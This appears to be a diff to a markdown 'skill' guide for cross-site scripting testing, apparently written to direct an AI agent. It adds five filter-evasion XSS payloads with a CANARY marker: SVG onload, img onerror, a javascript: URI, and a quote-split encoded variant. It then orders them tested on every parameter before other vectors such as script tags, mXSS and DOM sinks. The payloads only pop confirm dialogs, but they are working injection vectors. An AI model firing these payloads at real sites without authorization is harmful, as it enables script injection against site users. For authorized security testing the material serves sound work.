@@ -15,6 +15,11 @@ JavaScript:confirm`K`
 1%3C!--%3E%3CSvg%0COnLoad=(confirm)(7110)--%3E
 1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E
 1<!--><Svg/OnLoad=(confirm)(1)-->
+1<!--><Svg/OnLoad=(confirm)(CANARY)-->
+1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
+1%3C!--%3E%3CSvg%0COnLoad=(confirm)(CANARY)--%3E
+JavaScript:confirm`CANARY`
+%27%3C%27s%27v%27g%27+o%27n%27l%27o%27a%27d%27=%27a%27l%27e%27r%27t%27(CANARY)%27+%27%3E%27
 ```
 
 Test them on every parameter, in this order, before anything else. Only when all five are filtered, escaped or non-executing on that parameter do you test any other payload in this skill — `<script>`, event handlers, `java%09script:` / `JaVaScRiPt:` variants, mXSS, DOM sinks. Never open with a bare `<script>` or `java%09script:document.title='XSS`.
